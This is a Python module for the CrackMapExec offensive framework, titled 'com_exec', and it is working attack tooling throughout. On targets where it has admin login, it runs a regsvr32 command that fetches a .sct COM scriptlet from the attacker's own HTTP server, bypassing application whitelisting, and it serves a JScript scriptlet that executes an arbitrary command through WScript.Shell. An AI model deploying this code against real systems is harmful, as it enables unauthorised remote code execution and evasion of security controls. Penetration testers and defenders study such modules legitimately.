from cme.helpers import gen_random_string
from sys import exit
import os

class CMEModule:

    '''
        Executes a command using a COM scriptlet to bypass whitelisting

        Based on the awesome research by @subtee

        https://gist.github.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302
        http://subt0x10.blogspot.com/2016/04/bypass-application-whitelisting-script.html
    '''

    name='com_exec'

    description = 'Executes a command using a COM scriptlet to bypass whitelisting'

    required_server='http'

    def options(self, context, module_options):
        '''
            CMD      Command to execute on the target system(s) (Required if CMDFILE isn't specified)
            CMDFILE  File contaning the command to execute on the target system(s) (Required if CMD isn't specified)
        '''

        if not 'CMD' in module_options and not 'CMDFILE' in module_options:
            context.log.error('CMD or CMDFILE options are required!')
            sys.exit(1)

        if 'CMD' in module_options and 'CMDFILE' in module_options:
            context.log.error('CMD and CMDFILE are mutually exclusive!')
            sys.exit(1)

        if 'CMD' in module_options:
            self.command = module_options['CMD']

        elif 'CMDFILE' in module_options:
            path = os.path.expanduser(module_options['CMDFILE'])

            if not os.path.exists(path):
                context.log.error('Path to CMDFILE invalid!')
                sys.exit(1)

            with open(path, 'r') as cmdfile:
                self.command = cmdfile.read().strip()

        self.sct_name = gen_random_string(5)

    def on_admin_login(self, context, connection):

        command = 'regsvr32.exe /u /n /s /i:http://{}/{}.sct scrobj.dll'.format(context.localip, self.sct_name)
        connection.execute(command)
        context.log.success('Executed command')

    def on_request(self, context, request):
        if '{}.sct'.format(self.sct_name) in request.path[1:]:
            request.send_response(200)
            request.end_headers()

            com_script = '''<?XML version="1.0"?>
<scriptlet>
<registration
    description="Win32COMDebug"
    progid="Win32COMDebug"
    version="1.00"
    classid="{{AAAA1111-0000-0000-0000-0000FEEDACDC}}"
>
<script language="JScript">
    <![CDATA[
        var r = new ActiveXObject("WScript.Shell").Run("{}");
    ]]>
</script>
</registration>
<public>
    <method name="Exec"></method>
</public>
</scriptlet>'''.format(self.command)

            request.wfile.write(com_script)
            request.stop_tracking_host()

        else:
            request.send_response(404)
            request.end_headers()
